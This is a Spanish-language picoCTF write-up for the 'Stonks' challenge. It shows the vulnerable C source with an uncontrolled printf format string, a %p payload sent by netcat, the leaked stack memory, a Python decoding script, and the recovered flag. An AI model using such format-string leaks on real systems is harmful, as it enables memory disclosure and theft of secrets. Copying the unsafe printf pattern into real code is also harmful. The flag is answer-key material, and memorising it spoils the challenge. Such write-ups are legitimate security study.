
# Stonks

## Descripcion
I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure! [vuln.c](https://mercury.picoctf.net/static/a4ce675e8f85190152d66014c9eebd7e/vuln.c) `nc mercury.picoctf.net 59616`
## Pistas
Okay, maybe I'd believe you if you find my API key.
## Solucion
se nos da un codigo fuente y lo analizamos: 

```bash()
  GNU nano 6.4                                                                                                                                                                                                                          vuln.c                                                                                                                                                                                                                                   
        if (!p) {
                return 1;
        }
        printf("\nPortfolio as of ");
        fflush(stdout);
        system("date"); // TODO: implement this in C
        fflush(stdout);

        printf("\n\n");
        Stonk *head = p->head;
        if (!head) {
                printf("You don't own any stonks!\n");
        }
        while (head) {
                printf("%d shares of %s\n", head->shares, head->symbol);
                head = head->next;
        }
        return 0;
}

Stonk *pick_symbol_with_AI(int shares) {
        if (shares < 1) {
                return NULL;
        }
        Stonk *stonk = malloc(sizeof(Stonk));
        stonk->shares = shares;

        int AI_symbol_len = (rand() % MAX_SYM_LEN) + 1;
        for (int i = 0; i <= MAX_SYM_LEN; i++) {
                if (i < AI_symbol_len) {
                        stonk->symbol[i] = 'A' + (rand() % 26);
                } else {
                        stonk->symbol[i] = '\0';
                }
        }

        stonk->next = NULL;

        return stonk;
}

int buy_stonks(Portfolio *p) {
        if (!p) {
                return 1;
        }
        char api_buf[FLAG_BUFFER];
        FILE *f = fopen("api","r");
        if (!f) {
                printf("Flag file not found. Contact an admin.\n");
                exit(1);
        }
        fgets(api_buf, FLAG_BUFFER, f);

        int money = p->money;
        int shares = 0;
        Stonk *temp = NULL;
        printf("Using patented AI algorithms to buy stonks\n");
        while (money > 0) {
                shares = (rand() % money) + 1;
                temp = pick_symbol_with_AI(shares);
                temp->next = p->head;
                p->head = temp;
                money -= shares;
        }
        printf("Stonks chosen\n");

        // TODO: Figure out how to read token from file, for now just ask

        char *user_buf = malloc(300 + 1);
        printf("What is your API token?\n");
        scanf("%300s", user_buf);
        printf("Buying stonks with token:\n");
        printf(user_buf);

        // TODO: Actually use key to interact with API

        view_portfolio(p);

        return 0;
}

Portfolio *initialize_portfolio() {
        Portfolio *p = malloc(sizeof(Portfolio));
        p->money = (rand() % 2018) + 1;
        p->head = NULL;
        return p;
}

void free_portfolio(Portfolio *p) {
        Stonk *current = p->head;
        Stonk *next = NULL;
        while (current) {
                next = current->next;
                free(current);
                current = next;
        }
        free(p);
}

int main(int argc, char *argv[])
{
        setbuf(stdout, NULL);
        srand(time(NULL));
        Portfolio *p = initialize_portfolio();
        if (!p) {
                printf("Memory failure\n");
                exit(1);
        }

        int resp = 0;

        printf("Welcome back to the trading app!\n\n");
        printf("What would you like to do?\n");
        printf("1) Buy some stonks!\n");
        printf("2) View my portfolio\n");
        scanf("%d", &resp);

        if (resp == 1) {
                buy_stonks(p);
        } else if (resp == 2) {
                view_portfolio(p);
        }

        free_portfolio(p);
        printf("Goodbye!\n");

        exit(0);
}


```

Encontramos una funcion que lee la bandera en la pila y le pide al usuario que ingrese una entrada antes de imprimir la bandera con printf. Podemos explotar la vulnerabilidad de cadena o string format. 
Entonces ocupamos mandar muchos %x para ver cual desboardara la funcion. creamos un input con lo siguiente:

```bash()
1
%p__%p__%p__%p__%p__%p__%p__%p__%p__%p__%p__%p__%p__%p__%p__%p__%p__%p__%p__%p__%p__%p__%p__%p__%p__%p__%p__%p
```

Al insertarlo en el programa nos da lo siguiente:
```
┌──(kali㉿kali)-[~/notas-hacking/PicoCTf/binary/Stonks]
└─$ nc mercury.picoctf.net 59616 < input

Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
Buying stonks with token:
0x954f430__0x804b000__0x80489c3__0xf7f4cd80__0xffffffff__0x1__0x954d160__0xf7f5a110__0xf7f4cdc7__(nil)__0x954e180__0x1__0x954f410__0x954f430__0x6f636970__0x7b465443__0x306c5f49__0x345f7435__0x6d5f6c6c__0x306d5f79__0x5f79336e__0x38343136__0x34356562__0xff9b007d__0xf7f87af8__0xf7f5a440__0x3296e300__0x1
Portfolio as of Tue May 30 00:19:37 UTC 2023


1 shares of ISRQ
2 shares of BA
10 shares of F
24 shares of D
29 shares of WSG
43 shares of F
16 shares of V
123 shares of YOA
62 shares of J
89 shares of E
Goodbye!

```
Vemos que hay codigo ASCII y usamos un decodificador en python para obtener la bandera:
```bash()
from binascii import unhexlify
flag = b"".join(
	[ 
	unhexlify("6f636970")[::-1], 
	unhexlify("7b465443")[::-1],
	unhexlify("306c5f49")[::-1], 
	unhexlify("345f7435")[::-1],
	unhexlify("6d5f6c6c")[::-1],
	unhexlify("306d5f79")[::-1], 
	unhexlify("5f79336e")[::-1], 
	unhexlify("38343136")[::-1], 
	unhexlify("34356562")[::-1], 
	unhexlify("007d")[::-1], 
	]
).decode() 

print(flag)
```
y el resultado : 

```bash
┌──(kali㉿kali)-[~/notas-hacking/PicoCTf/binary/Stonks]
└─$ python3 unhex.py 
picoCTF{I_l05t_4ll_my_m0n3y_6148be54}
```


## Bandera

picoCTF{I_l05t_4ll_my_m0n3y_6148be54}

## Notas adicionales

| comando | descripcion

## Referencias
